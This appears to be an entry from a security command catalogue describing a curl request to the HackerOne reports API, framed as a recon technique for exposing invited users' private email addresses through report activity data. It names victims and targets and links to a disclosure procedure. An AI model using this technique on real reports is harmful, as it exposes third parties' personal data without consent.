---
id: cmd-001
data: >-
  curl "https://api.hackerone.com/v1/reports/[report_id]" -u
  "api_identifier:token"
tags:
  - api
  - recon
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:48.500Z'
verified: false
validated: true
submitted: true
---
# curl-hackerone-report-fetch

## Command

```bash
curl "https://api.hackerone.com/v1/reports/[report_id]" -u "api_identifier:token"
```

## Description

This command fetches details of a specific HackerOne report via the API using basic authentication, exposing private user data like emails in the activities object when a victim has been invited.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[report_id]` | The ID of the target report (e.g., 12345) | Yes |
| `api_identifier:token` | Basic auth string with API identifier and token (e.g., user@example.com:abc123token) | Yes |
| `-u` | Specifies the username:password for basic auth | Yes |

## Examples

### Basic Usage

```bash
curl "https://api.hackerone.com/v1/reports/196655" -u "api@example.com:your_token"
```

### Advanced Usage

```bash
curl -H "Accept: application/json" "https://api.hackerone.com/v1/reports/[report_id]" -u "api_identifier:token" | jq '.data.attributes.activities'
```

(Uses jq for JSON parsing to focus on activities.)

## Expected Output

JSON response containing report data, including an activities array with objects like {"type": "activity-external-user-invited", "attributes": {"email": "victim@private.com"}}. Successful auth returns 200 OK; errors include 401 Unauthorized if token invalid.

## Related

- [[Related Procedure|procedures/Disclose-User-Email-via-HackerOne-Report-API]]
